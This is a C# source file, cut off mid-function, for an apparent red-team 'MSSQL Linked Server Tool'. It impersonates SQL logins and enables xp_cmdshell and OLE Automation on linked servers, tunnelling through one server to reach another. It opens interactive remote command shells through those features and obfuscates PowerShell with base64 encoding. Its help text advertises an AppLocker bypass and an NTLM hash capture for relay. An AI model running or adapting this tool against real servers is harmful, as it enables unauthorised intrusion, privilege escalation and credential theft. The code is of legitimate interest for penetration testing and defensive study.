using System;
using System.Data.SqlClient;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Security.Cryptography;
using System.Globalization;
using System.Diagnostics;

namespace sql
{
    class Program
    {
        public static void Main(string[] args)
        {
            go(args);
        }
        public static void go(string[] args)
        {
            string username = "";
            string password = "";
            string sqlServer = "localhost";
            string database = "master";
            string impersonateuser = "";
            bool querymode = false;
            bool enablefeatures = false;
            bool runxpcmd = false;
            bool runolecmd = false;
            bool splash = true;
            bool impersonate = false;
            bool hash = false;
            bool enumerate = false;
            bool localcommand = false;
            bool tunnel = false;
            foreach (string arg in args)
            {
                switch (arg.Substring(0, 2).ToUpper())
                {
                    case "/L":
                        username = arg.Substring(3);
                        break;
                    case "/P":
                        password = arg.Substring(3);
                        break;
                    case "/D":
                        database = arg.Substring(3);
                        break;
                    case "/S":
                        sqlServer = arg.Substring(3);
                        break;
                    case "/Q":
                        querymode = true;
                        splash = false;
                        break;
                    case "/F":
                        enablefeatures = true;
                        splash = false;
                        break;
                    case "/E":
                        enumerate = true;
                        splash = false;
                        break;
                    case "/X":
                        runxpcmd = true;
                        splash = false;
                        break;
                    case "/C":
                        localcommand = true;
                        splash = false;
                        break;
                    case "/O":
                        runolecmd = true;
                        splash = false;
                        break;
                    case "/I":
                        impersonateuser = arg.Substring(3);
                        impersonate = true;
                        break;
                    case "/T":
                        tunnel = true;
                        break;
                    case "/H":
                        hash = true;
                        splash = false;
                        break;
                    default:
                        Console.WriteLine("Default!");
                        break;
                }
            }
            if (splash)
            {
                Console.WriteLine("MSSQL Linked Server Tool");
                Console.WriteLine("");
                Console.WriteLine("Compatible with InstallUtil AppLocker bypass; Use /s=SQL05 syntax instead of /s:SQL05 with InstallUtil.");
                Console.WriteLine("");
                Console.WriteLine("Modes:");
                Console.WriteLine(" /q - Query  Query a domain for MSSQL SPN's");
                Console.WriteLine(" /e - Enumerate   Find Linked MSSQL instances and enumerate permissions");
                Console.WriteLine(" /c - Command Execute sql queries on the logged in server");
                Console.WriteLine(" /f - Enable  Enable features like XP_cmdshell and OLE objects on a Linked server");
                Console.WriteLine(" /x - Command Execute commands via XP_cmdshell on a linked server");
                Console.WriteLine(" /o - Command Execute commands via OLE object on a linked server");
                Console.WriteLine(" /h - Force SQL server to authenticate to an SMB share in order to capture hash for use with ntlmrelayx");
                Console.WriteLine("");
                Console.WriteLine("Options:");
                Console.WriteLine(" /l: Login (username) to authenticate with (default: Windows credentials)");
                Console.WriteLine(" /p: Password to authenticate with");
                Console.WriteLine(" /d: Database to connect to (default: Master)");
                Console.WriteLine(" /s: Server to connect to (default: Localhost)");
                Console.WriteLine(" /i: User to impersonate. Enter \"dbo\" to try and auth as dbo in the msdb database.");
                Console.WriteLine(" /t: Tunnel through a Linked MSSQL server in order to complete tasks on one of its Linked servers.");
            }
            else if (querymode)
            {

                Console.Write("Enter domain to query for MSSQL spn's: ");
                string domain = Console.ReadLine();
                string enumcommand = "/c setspn -T " + domain + " -Q MSSQLSvc/*";
                Console.WriteLine("");
                try
                {
                    var process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = "C:\\Windows\\System32\\cmd.exe",
                            Arguments = enumcommand,
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            CreateNoWindow = true
                        }
                    };
                    process.Start();
                    while (!process.StandardOutput.EndOfStream)
                    {
                        var line = process.StandardOutput.ReadLine();
                        Console.WriteLine(line);
                    }
                    process.WaitForExit();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else
            {
                string conString = "";
                if (username != "")
                {
                    conString = "Server = " + sqlServer + "; Database = " + database + "; User id = " + username + "; Password = " + password + ";";
                }
                else
                {
                    conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
                }
                SqlConnection con = new SqlConnection(conString);
                try
                {
                    con.Open();
                }
                catch
                {
                    Console.WriteLine("Auth failed");
                    Environment.Exit(0);
                }
                Console.WriteLine("");
                String queryhostname = "SELECT @@SERVERNAME;";
                SqlCommand command = new SqlCommand(queryhostname, con);
                SqlDataReader reader = command.ExecuteReader();
                reader.Read();
                string host = Convert.ToString(reader[0]);
                Console.WriteLine("Logged in on: " + host);
                reader.Close();
                String querylogin = "SELECT SYSTEM_USER;";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                string user = Convert.ToString(reader[0]);
                Console.WriteLine("Logged in as user: " + user);
                reader.Close();
                querylogin = "SELECT USER_NAME();";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                string sqluser = Convert.ToString(reader[0]);
                Console.WriteLine(user + " is mapped to SQL account: " + sqluser);
                reader.Close();
                if (impersonate)
                {
                    Console.WriteLine("");
                    string impcommand = "";
                    Console.WriteLine("Attempting to execute commands as " + impersonateuser + "...");
                    if (impersonateuser == "dbo")
                    {
                        impcommand = "use msdb; EXECUTE AS USER = 'dbo';";
                    }
                    else
                    {
                        impcommand = "execute as login = '" + impersonateuser + "';";
                    }
                    command = new SqlCommand(impcommand, con);
                    try
                    {
                        reader = command.ExecuteReader();
                        Console.WriteLine("Successfully executing commands as " + impersonateuser + "!");
                        user = impersonateuser;
                    }
                   catch
                    {
                        Console.WriteLine("Insufficient permissions to execute permissions of " + impersonateuser + ", or specified entry is a group not a user.");
                    }
                    reader.Close();
                }
                String execCmd = "EXEC sp_linkedservers;";
                command = new SqlCommand(execCmd, con);
                reader = command.ExecuteReader();
                var linkedservers = new List<string>();
                while (reader.Read())
                {
                    if (Convert.ToString((reader[0])).ToUpper() != host)
                    {
                        linkedservers.Add(Convert.ToString((reader[0])).ToUpper());
                    }
                }
                reader.Close();
                string[] linkedserversarray = linkedservers.ToArray();
                Action<Array> ListLinked = (arg1) =>
                {
                    Console.WriteLine("");
                    Console.WriteLine("Linked Servers:");
                    Console.WriteLine("");
                    foreach (string i in arg1)
                    {
                         Console.WriteLine(i);

                    }
                    Console.WriteLine("");
                };
                if (localcommand)
                {
                    string localcmd = "";
                    Console.WriteLine("");
                    Console.WriteLine("Executing sql queries on current server");
                    Console.WriteLine("");
                    while (true)
                    {
                        Console.Write(host + "> ");
                        localcmd = Console.ReadLine();
                        if (localcmd == "exit")
                        {
                            con.Close();
                            System.Environment.Exit(0);
                        }
                        execCmd = localcmd;
                        command = new SqlCommand(execCmd, con);
                        try
                        {
                            reader = command.ExecuteReader();
                        }
                        catch
                        {
                            {
                                Console.WriteLine("Error executing command!");
                            }
                        }
                        try
                        {
                            int count = reader.FieldCount;
                            while (reader.Read())
                            {
                                for (int i = 0; i < count; i++)
                                {
                                    Console.WriteLine(reader.GetValue(i));
                                }
                            }
                            reader.Close();
                        }
                        catch
                        {
                            {
                                Console.WriteLine("Error fetching output!");
                            }
                        }
                    }
                }
                if (enumerate)
                {
                    Console.WriteLine("");
                    String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
                    command = new SqlCommand(querypublicrole, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Int32 role = Int32.Parse(reader[0].ToString());
                    if (role == 1)
                    {
                        Console.WriteLine(user + " is a member of public role");
                    }
                    else
                    {
                        Console.WriteLine(user + " is NOT a member of public role");
                    }
                    reader.Close();

                    String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
                    command = new SqlCommand(querysysadminrole, con);
                    reader = command.ExecuteReader();
                    reader.Read();
                    Int32 sysadminrole = Int32.Parse(reader[0].ToString());
                    if (sysadminrole == 1)
                    {
                        Console.WriteLine(user + " is a member of sysadmin role");
                    }
                    else
                    {
                        Console.WriteLine(user + " is NOT a member of sysadmin role. Note that all linked SQL servers may not be displayed!");
                    }
                    reader.Close();
                    Console.WriteLine("");
                    string queryusers = "select * from master.sys.server_principals;";
                    command = new SqlCommand(queryusers, con);
                    reader = command.ExecuteReader();
                    Console.WriteLine("SQL users found:");
                    while (reader.Read())
                    {
                        Console.WriteLine(reader[0]);
                    }
                    reader.Close();
                    Console.WriteLine("");
                    String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
                    command = new SqlCommand(query, con);
                    reader = command.ExecuteReader();
                    Console.WriteLine("Logins that can be impersonated (Remember to check /i:dbo!): ");
                    while (reader.Read() == true)
                    {
                        Console.WriteLine(reader[0]);
                    }
                    reader.Close();
                    Console.WriteLine("");
                    foreach (string i in linkedservers)
                    {
                        string remotehost = "";
                        Console.WriteLine("Linked SQL server: " + i);
                        execCmd = "select * from openquery(\"" + i + "\", 'SELECT SYSTEM_USER');";
                        command = new SqlCommand(execCmd, con);
                        try
                        {
                            reader = command.ExecuteReader();
                        }
                        catch
                        {
                            {
                                Console.WriteLine("Failed to execute openquery on linked server; Either insufficient permissions or this is the local SQL service");
                            }
                        }
                        try
                        {
                            while (reader.Read())
                            {
                                user = Convert.ToString(reader[0]);
                                Console.WriteLine("On " + i + " we are: " + user);
                            }
                            reader.Close();
                        }
                        catch
                        {
                            { }
                        }
                        execCmd = "select * from openquery(\"" + i + "\", 'SELECT USER_NAME()');";
                        command = new SqlCommand(execCmd, con);
                        try
                        {
                            reader = command.ExecuteReader();
                        }
                        catch
                        {
                            { }
                        }
                        try
                        {
                            reader.Read();
                            string mappeduser = Convert.ToString(reader[0]);
                            Console.WriteLine(user + " is mapped to SQL account: " + mappeduser);
                            reader.Close();
                        }
                        catch
                        {
                            { }
                        }
                        execCmd = "select * from openquery(\"" + i + "\", 'SELECT IS_SRVROLEMEMBER(''sysadmin'');');";
                        command = new SqlCommand(execCmd, con);
                        try
                        {
                            reader = command.ExecuteReader();
                        }
                        catch
                        {
                            { }
                        }
                        try
                        {
                            reader.Read();
                            sysadminrole = Int32.Parse(reader[0].ToString());
                            if (sysadminrole == 1)
                            {
                                Console.WriteLine(user + " is a member of sysadmin role");
                            }
                            else
                            {
                                Console.WriteLine(user + " is NOT a member of sysadmin role");
                            }
                            reader.Close();
                        }
                        catch
                        {
                            { }
                        }
                        queryhostname = "EXEC('SELECT @@SERVERNAME;') AT " + i + ";";
                        command = new SqlCommand(queryhostname, con);
                        try
                        {
                            reader = command.ExecuteReader();
                        }
                        catch
                        {
                            {
                                Console.WriteLine("error executing server name query!");
                            }
                        }
                        try
                        {
                            reader.Read();
                            remotehost = Convert.ToString(reader[0]);
                        }
                        catch
                        {
                            {
                                Console.WriteLine("eror reading server name!");
                            }
                        }
                        reader.Close();
                        Console.WriteLine("Linked servers on " + i + ":");
                        execCmd = "EXEC ('sp_linkedservers') AT " + i;
                        command = new SqlCommand(execCmd, con);
                        var remotelinkedservers = new List<string>(); ;
                        try
                        {
                            reader = command.ExecuteReader();
                        }
                        catch
                        {
                            { }
                        }
                        try
                        {
                            while (reader.Read())
                            {
                                if (reader[0].ToString() != remotehost)
                                {
                                    remotelinkedservers.Add(Convert.ToString((reader[0])));
                                }
                            }
                            reader.Close();
                        }
                        catch
                        {
                            { }
                        }
                        string[] remotelinkedserversarray = remotelinkedservers.ToArray();
                        foreach (string j in remotelinkedserversarray)
                            {
                            if (host.Contains(j))
                            {
                                Console.WriteLine("**BIDIRECTIONAL LINK FOUND! " + i + " is linked back to " + host + "!**");
                            }
                            else
                            {
                                Console.WriteLine(j);
                            }
                            execCmd = "select mylogin from openquery(\"dc01\", 'select mylogin from openquery(\"appsrv01\",''select SYSTEM_USER as mylogin'')');";
                            command = new SqlCommand(execCmd, con);
                            try
                            {
                                reader = command.ExecuteReader();
                            }
                            catch
                            {
                                { }
                            }
                            try
                            {
                                reader.Read();
                                string mappeduser = Convert.ToString(reader[0]);
                                Console.WriteLine(i + " executes as " + Convert.ToString(reader[0]) + " on " + j);
                                reader.Close();
                            }
                            catch
                            {
                                { }
                            }
                        }
                    }
                    con.Close();
                }
                else if (enablefeatures)
                {
                    string target = "";
                    string feature;
                    ListLinked(linkedserversarray);
                    Console.WriteLine("Select feature you wish to enable:");
                    Console.WriteLine(" Enter 1 for xp_cmdshell");
                    Console.WriteLine(" Enter 2 for OLE objects");
                    while(true)
                    {
                        Console.Write("Entry: ");
                        feature = Console.ReadLine();
                        if (feature == "exit")
                        {
                            con.Close();
                            System.Environment.Exit(0);
                        }
                        else if (feature == "1" || feature == "2")
                        {
                            break;
                        }
                        else
                        {
                            Console.WriteLine("Invalid selection. Type exit to close application.");
                        }
                    }
                    Console.WriteLine("");
                    if (feature == "1")
                    {
                        if(tunnel)
                        {
                            string tunneltarget = "";
                            while (true)
                            {
                                Console.Write("Enter hostname of Linked SQL server to tunnel through: ");
                                tunneltarget = Console.ReadLine();
                                if (linkedservers.Contains((tunneltarget).ToUpper()))
                                {
                                    break;
                                }
                                else if (target == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else
                                {
                                    Console.WriteLine("Invalid entry. Type exit to close application.");
                                }
                            }
                            Console.Write("Enter hostname of endpoint SQL server to enable xp_cmdshell on: ");
                            target = Console.ReadLine();
                            if (target == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            Console.WriteLine("");
                            Console.WriteLine("Attempting to enable xp_cmdshell on " + target + " via link on Linked Server " + tunneltarget + "...");
                            execCmd = "EXEC('EXEC(''sp_configure ''''show advanced options'''', 1; reconfigure; EXEC sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT " + target + ";') AT " + tunneltarget + ";";
                            command = new SqlCommand(execCmd, con);
                            try
                            {
                                reader = command.ExecuteReader();
                            }
                            catch
                            {
                                { }
                            }
                            reader.Close();
                            execCmd = "EXEC('EXEC(''SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = ''''xp_cmdshell'''';'') AT " + target + ";') AT " + tunneltarget + ";";
                            command = new SqlCommand(execCmd, con);
                            try
                            {
                                reader = command.ExecuteReader();
                                reader.Read();
                                Int32 xp_cmdshell_status = Int32.Parse((reader[1]).ToString());
                                if (xp_cmdshell_status == 1)
                                {
                                    Console.WriteLine("xp_cmdshell successfully enabled on " + target);
                                }
                                else
                                {
                                    Console.WriteLine("Failed to enable xp_cmdshell on " + target);
                                }
                            }
                            catch
                            {
                                Console.WriteLine("Error trying to enable xp_cmdshell on " + target);
                            }
                        }
                        else
                        {
                            while (true)
                            {
                                Console.Write("Enter hostname of Linked SQL server to enable features on (self to enable features on current server): ");
                                target = Console.ReadLine();
                                if (linkedservers.Contains((target).ToUpper()))
                                {
                                    break;
                                }
                                else if (target == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else if (target == "self")
                                {
                                    break;
                                }
                                else
                                {
                                    Console.WriteLine("Invalid entry.  Type exit to close application.");
                                }
                            }
                            if (target == "self")
                            {
                                execCmd = "sp_configure 'show advanced options', 1; reconfigure; EXEC sp_configure 'xp_cmdshell', 1; reconfigure;";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch
                                {
                                    { }
                                }
                                reader.Close();
                                execCmd = "SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                    reader.Read();
                                    Int32 xp_cmdshell_status = Int32.Parse((reader[1]).ToString());
                                    if (xp_cmdshell_status == 1)
                                    {
                                        Console.WriteLine("xp_cmdshell successfully enabled on " + host);
                                    }
                                    else
                                    {
                                        Console.WriteLine("Failed to enable xp_cmdshell on " + host);
                                    }
                                }
                                catch
                                {
                                    Console.WriteLine("Error trying to enable xp_cmdshell on " + host);
                                }
                            }
                            else
                            {
                                string enablerpccmd = "EXEC sp_serveroption '" + target + "', 'rpc out', 'true';  ";
                                command = new SqlCommand(enablerpccmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();

                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine(ex.ToString());
                                }
                                reader.Close();
                                execCmd = "EXEC('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT " + target + ";";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine(ex.ToString());
                                }
                                reader.Close();
                                execCmd = "EXEC('SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = ''xp_cmdshell'';') AT " + target + ";";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                    reader.Read();
                                    Int32 xp_cmdshell_status = Int32.Parse((reader[1]).ToString());
                                    if (xp_cmdshell_status == 1)
                                    {
                                        Console.WriteLine("xp_cmdshell successfully enabled on " + target);
                                    }
                                    else
                                    {
                                        Console.WriteLine("Failed to enable xp_cmdshell on " + target);
                                    }
                                }
                                catch
                                {
                                    Console.WriteLine("Error trying to enable xp_cmdshell on " + target);
                                }
                            }
                        }

                    }
                    else //Enable OLE Objects
                    {
                        if(tunnel)
                        {
                            string tunneltarget = "";
                            while (true)
                            {
                                Console.Write("Enter hostname of Linked SQL server to tunnel through: ");
                                tunneltarget = Console.ReadLine();
                                if (linkedservers.Contains((tunneltarget).ToUpper()))
                                {
                                    break;
                                }
                                else if (target == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else
                                {
                                    Console.WriteLine("Invalid entry. Type exit to close application.");
                                }
                            }
                            Console.Write("Enter hostname of endpoint SQL server to enable xp_cmdshell on: ");
                            target = Console.ReadLine();
                            if (target == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            Console.WriteLine("");
                            Console.WriteLine("Attempting to enable Ole Automation Procedures on " + target + " via link on Linked Server " + tunneltarget + "...");
                            execCmd = "EXEC('EXEC(''sp_configure ''''Ole Automation Procedures'''', 1;RECONFIGURE'') AT " + target + ";') AT " + tunneltarget + ";";
                            command = new SqlCommand(execCmd, con);
                            try
                            {
                                reader = command.ExecuteReader();
                            }
                            catch
                            {
                                { }
                            }
                            reader.Close();
                            execCmd = "EXEC('EXEC(''SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = ''''Ole Automation Procedures'''';'') AT " + target + ";') AT " + tunneltarget + ";";
                            command = new SqlCommand(execCmd, con);
                            try
                            {
                                reader = command.ExecuteReader();
                                reader.Read();
                                Int32 xp_cmdshell_status = Int32.Parse((reader[1]).ToString());
                                if (xp_cmdshell_status == 1)
                                {
                                    Console.WriteLine("Ole Automation Procedures successfully enabled on " + target);
                                }
                                else
                                {
                                    Console.WriteLine("Failed to enable Ole Automation Procedures on " + target);
                                }
                            }
                            catch
                            {
                                Console.WriteLine("Error trying to enable Ole Automation Procedures on " + target);
                            }
                        }
                        else
                        {
                            while (true)
                            {
                                Console.Write("Enter hostname of Linked SQL server to enable features on (self to enable features on current server): ");
                                target = Console.ReadLine();
                                if (linkedservers.Contains((target).ToUpper()))
                                {
                                    break;
                                }
                                else if (target == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else if (target == "self")
                                {
                                    break;
                                }
                                else
                                {
                                    Console.WriteLine("Invalid entry.  Type exit to close application.");
                                }
                            }
                            if (target == "self")
                            {
                                execCmd = "EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE;";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch
                                {
                                    { }
                                }
                                reader.Close();
                                execCmd = "SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'Ole Automation Procedures';";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                    reader.Read();
                                    Int32 xp_cmdshell_status = Int32.Parse((reader[1]).ToString());
                                    if (xp_cmdshell_status == 1)
                                    {
                                        Console.WriteLine("Ole Automation Procedures successfully enabled on " + host);
                                    }
                                    else
                                    {
                                        Console.WriteLine("Failed to enable Ole Automation Procedures on " + host);
                                    }
                                }
                                catch
                                {
                                    Console.WriteLine("Error trying to enable Ole Automation Procedures on " + host);
                                }
                            }
                            else
                            {
                                string enablerpccmd = "EXEC sp_serveroption '" + target + "', 'rpc out', 'true';  ";
                                command = new SqlCommand(enablerpccmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();

                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine(ex.ToString());
                                }
                                reader.Close();
                                execCmd = "EXEC('sp_configure ''Ole Automation Procedures'', 1;RECONFIGURE') AT " + target + ";";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch
                                {
                                    { }
                                }
                                reader.Close();
                                execCmd = "EXEC('SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = ''Ole Automation Procedures'';') AT " + target + ";";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                    reader.Read();
                                    Int32 xp_cmdshell_status = Int32.Parse((reader[1]).ToString());
                                    if (xp_cmdshell_status == 1)
                                    {
                                        Console.WriteLine("Ole Automation Procedures successfully enabled on " + target);
                                    }
                                    else
                                    {
                                        Console.WriteLine("Failed to enable Ole Automation Procedures on " + target);
                                    }
                                }
                                catch
                                {
                                    Console.WriteLine("Error trying to enable Ole Automation Procedures on " + target);
                                }
                            }
                        }
                    }
                    reader.Close();
                }
                else if (runxpcmd)
                {
                    ListLinked(linkedserversarray);
                    string target = "";
                    string usercmd = "";
                    if(tunnel)
                    {
                        string tunneltarget = "";
                        while (true)
                        {
                            Console.Write("Enter hostname of Linked SQL server to tunnel xp_cmdshell commands through: ");
                            tunneltarget = Console.ReadLine();
                            if (linkedservers.Contains((tunneltarget).ToUpper()))
                            {
                                break;
                            }
                            else if (target == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            else
                            {
                                Console.WriteLine("Invalid entry. Type exit to close application.");
                            }
                        }
                        Console.Write("Enter hostname of endpoint SQL server to run xp_cmdshell commands on: ");
                        target = Console.ReadLine();
                        if (target == "exit")
                        {
                            con.Close();
                            System.Environment.Exit(0);
                        }
                        Console.WriteLine("");
                        Console.WriteLine("Executing commands on " + target + " via link on Linked Server " + tunneltarget + "...");
                        Console.WriteLine("");
                        while (true)
                        {
                            Console.Write(target + "> ");
                            usercmd = Console.ReadLine();
                            if (usercmd == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            else if (usercmd.Contains("powershell") || usercmd.Contains("powershell.exe"))
                            {
                                string parsed = usercmd.Replace("powershell", "").Replace("powershell.exe", "");
                                string encoded = parsed.EncodeBase64();
                                usercmd = "powershell -enc " + encoded;
                            }
                            execCmd = "EXEC ('EXEC(''xp_cmdshell ''''" + usercmd + "'''';'') AT " + target + ";') AT " + tunneltarget + ";";
                            command = new SqlCommand(execCmd, con);
                            try
                            {
                                reader = command.ExecuteReader();
                            }
                            catch
                            {
                                {
                                    Console.WriteLine("Error executing command!");
                                }
                            }
                            try
                            {
                                while (reader.Read())
                                {
                                    Console.WriteLine(reader[0]);
                                }
                                reader.Close();
                            }
                            catch
                            {
                                {
                                    Console.WriteLine("Error fetching output!");
                                }
                            }
                        }
                    }
                    else
                    {
                        while (true)
                        {
                            Console.Write("Enter hostname of Linked SQL server to run xp_cmdshell commands on (self to run commands on current server): ");
                            target = Console.ReadLine();
                            if (linkedservers.Contains((target).ToUpper()))
                            {
                                break;
                            }
                            else if (target == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            else if (target == "self")
                            {
                                break;
                            }
                            else
                            {
                                Console.WriteLine("Invalid entry. Type exit to close application.");
                            }
                        }
                        if (target == "self")
                        {
                            Console.WriteLine("");
                            while (true)
                            {
                                Console.Write(host + "> ");
                                usercmd = Console.ReadLine();
                                if (usercmd == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else if (usercmd.Contains("powershell") || usercmd.Contains("powershell.exe"))
                                {
                                    string parsed = usercmd.Replace("powershell", "").Replace("powershell.exe", "");
                                    string encoded = parsed.EncodeBase64();
                                    usercmd = "powershell -enc " + encoded;
                                }
                                execCmd = "EXEC xp_cmdshell '" + usercmd + "';";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch
                                {
                                    {
                                        Console.WriteLine("Error executing command! You may be guest on this server/not have xp_cmdshell permissions!");
                                    }
                                }
                                try
                                {
                                    while (reader.Read())
                                    {
                                        Console.WriteLine(reader[0]);
                                    }
                                    reader.Close();
                                }
                                catch
                                {
                                    {
                                        Console.WriteLine("Error fetching output!");
                                    }
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("");
                            while (true)
                            {
                                Console.Write(target + "> ");
                                usercmd = Console.ReadLine();
                                if (usercmd == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else if (usercmd.Contains("powershell") || usercmd.Contains("powershell.exe"))
                                {
                                    string parsed = usercmd.Replace("powershell", "").Replace("powershell.exe", "");
                                    string encoded = parsed.EncodeBase64();
                                    usercmd = "powershell -enc " + encoded;
                                }
                                execCmd = "EXEC('xp_cmdshell ''" + usercmd + "'';') AT " + target + ";";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch
                                {
                                    {
                                        Console.WriteLine("Error executing command!");
                                    }
                                }
                                try
                                {
                                    while (reader.Read())
                                    {
                                        Console.WriteLine(reader[0]);
                                    }
                                    reader.Close();
                                }
                                catch
                                {
                                    {
                                        Console.WriteLine("Error fetching output!");
                                    }
                                }
                            }
                        }
                    }
                }
                else if (runolecmd)
                {
                    ListLinked(linkedserversarray);
                    string target = "";
                    string usercmd = "";
                    if (tunnel)
                    {
                        string tunneltarget = "";
                        while (true)
                        {
                            Console.Write("Enter hostname of Linked SQL server to tunnel OLE object commands through: ");
                            tunneltarget = Console.ReadLine();
                            if (linkedservers.Contains((tunneltarget).ToUpper()))
                            {
                                break;
                            }
                            else if (target == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            else
                            {
                                Console.WriteLine("Invalid entry. Type exit to close application.");
                            }
                        }
                        Console.Write("Enter hostname of endpoint SQL server to run OLE object commands on: ");
                        target = Console.ReadLine();
                        if (target == "exit")
                        {
                            con.Close();
                            System.Environment.Exit(0);
                        }
                        Console.WriteLine("");
                        Console.WriteLine("NOTE: Commands run via OLE objects will not produce output or errors! If possible test command execution with ping/other method!");
                        Console.WriteLine("");
                        Console.WriteLine("Executing commands on " + target + " via link on Linked Server " + tunneltarget + "...");
                        Console.WriteLine("");
                        while (true)
                        {
                            Console.Write(target + "> ");
                            usercmd = Console.ReadLine();
                            if (usercmd == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            else if (usercmd.Contains("powershell") || usercmd.Contains("powershell.exe"))
                            {
                                string parsed = usercmd.Replace("powershell", "").Replace("powershell.exe", "");
                                string encoded = parsed.EncodeBase64();
                                usercmd = "powershell -enc " + encoded;
                            }
                            execCmd = "EXEC('EXEC(''DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''cmd /c \"" + usercmd + "\"'''';'') AT " + target + ";') AT " + tunneltarget + ";";
                            command = new SqlCommand(execCmd, con);
                            try
                            {
                                reader = command.ExecuteReader();
                            }
                            catch
                            {
                                {
                                    Console.WriteLine("Error executing command! Check your hostnames and your permissions!");
                                }
                            }
                            reader.Close();
                        }
                    }
                    else
                    {
                        while (true)
                        {
                            Console.Write("Enter hostname of Linked SQL server to run OLE object commands on (self to run commands on current server): ");
                            target = Console.ReadLine();
                            if (linkedservers.Contains((target).ToUpper()))
                            {
                                break;
                            }
                            else if (target == "exit")
                            {
                                con.Close();
                                System.Environment.Exit(0);
                            }
                            else if (target == "self")
                            {
                                break;
                            }
                            else
                            {
                                Console.WriteLine("Invalid entry. Type exit to close application.");
                            }
                        }
                        Console.WriteLine("");
                        Console.WriteLine("NOTE: Commands run via OLE objects will not produce output or errors! If possible test command execution with ping/other method!");
                        if (target == "self")
                        {
                            Console.WriteLine("");
                            while (true)
                            {
                                Console.Write(host + "> ");
                                usercmd = Console.ReadLine();
                                if (usercmd == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else if (usercmd.Contains("powershell") || usercmd.Contains("powershell.exe"))
                                {
                                    string parsed = usercmd.Replace("powershell", "").Replace("powershell.exe", "");
                                    string encoded = parsed.EncodeBase64();
                                    usercmd = "powershell -enc " + encoded;
                                }
                                execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"" + usercmd + "\"';";
                                command = new SqlCommand(execCmd, con);
                                try
                                {
                                    reader = command.ExecuteReader();
                                }
                                catch
                                {
                                    {
                                        Console.WriteLine("Error executing command! You may be guest on this server/not have OLE object permissions!");
                                    }
                                }
                                reader.Close();
                            }
                        }
                        else
                        {
                            Console.WriteLine("");
                            while (true)
                            {
                                Console.Write(target + "> ");
                                usercmd = Console.ReadLine();
                                if (usercmd == "exit")
                                {
                                    con.Close();
                                    System.Environment.Exit(0);
                                }
                                else if (usercmd.Contains("powershell") || usercmd.Contains("powershell.exe"))
                                {
                                    string parsed = usercmd.Replace("powershell", "").Replace("powershell.exe", "");
                                    string encoded = parsed.EncodeBase64();
                                    usercmd = "powershell -enc " + encoded;
                                }
